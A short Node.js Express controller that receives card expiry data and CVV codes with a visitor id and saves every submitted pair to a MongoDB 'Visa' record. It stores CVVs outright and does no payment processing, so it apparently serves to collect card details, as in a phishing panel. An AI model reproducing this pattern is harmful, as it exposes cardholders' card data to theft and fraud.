const Visa = require('../models/visa');

exports.submitVisaPayment = async (req, res) => {
  try {
    const { expdata, cvv, uniqueid } = req.body;
    let visaPayment = await Visa.findOne({ uniqueid });

    if (visaPayment) {
      visaPayment.entries.push({ expdata, cvv });
    } else {
      visaPayment = new Visa({
        uniqueid,
        entries: [{ expdata, cvv }]
      });
    }

    await visaPayment.save();
    res.status(200).json({
      success: true,
      message: "Visa Payment Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting Visa payment data"
    });
  }
};
